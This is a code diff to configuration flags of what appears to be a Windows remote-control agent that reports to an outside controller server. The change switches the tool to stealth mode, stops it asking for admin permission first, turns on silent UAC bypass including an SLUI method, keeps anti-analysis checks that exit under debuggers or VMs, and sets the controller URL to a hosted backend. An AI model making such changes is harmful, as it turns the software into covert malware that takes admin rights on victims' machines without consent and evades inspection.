@@ -8,7 +8,7 @@ import sys
 import os
 
 # Debug flag for UAC and privilege operations
-UAC_DEBUG = True  # Set to True to see detailed UAC/privilege debugging
+UAC_DEBUG = False  # Set to True to see detailed UAC/privilege debugging
 
 def debug_print(msg):
     """Print debug messages directly (bypasses all logging systems)"""
@@ -186,25 +186,25 @@ PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 """
 
 # Configuration flags
-SILENT_MODE = False  # DISABLED for debugging - enable stealth operation (no console output)
-DEBUG_MODE = True  # Enable debug logging for troubleshooting
-UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
+SILENT_MODE = True  # DISABLED for debugging - enable stealth operation (no console output)
+DEBUG_MODE = False  # Enable debug logging for troubleshooting
+UAC_PRIVILEGE_DEBUG = False  # Enable detailed UAC and privilege debugging
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 KEEP_ORIGINAL_PROCESS = True  # FALSE = Exit original process after getting admin (prevent duplicates)
 ENABLE_ANTI_ANALYSIS = True  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
 
 # ✅ NEW ETHICAL SETTINGS
-REQUEST_ADMIN_FIRST = True  # TRUE = Request admin permission FIRST before doing anything
+REQUEST_ADMIN_FIRST = False  # TRUE = Request admin permission FIRST before doing anything
 DISABLE_UAC_BYPASS = False   # TRUE = Disable all silent UAC bypass attempts
 MAX_PROMPT_ATTEMPTS = 3     # Limit prompts to 3 attempts instead of 999
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
-#FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
-FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://test-j2w7.onrender.com/dashboard')
-DISABLE_SLUI_BYPASS = True
-UAC_BYPASS_DEBUG_MODE = True
+FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
+#FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://test-j2w7.onrender.com/dashboard')
+DISABLE_SLUI_BYPASS = False
+UAC_BYPASS_DEBUG_MODE = False
 
 # Eventlet is now patched at the very top of the file (line 1-2)
 # This section is kept for compatibility but monkey_patch is already done
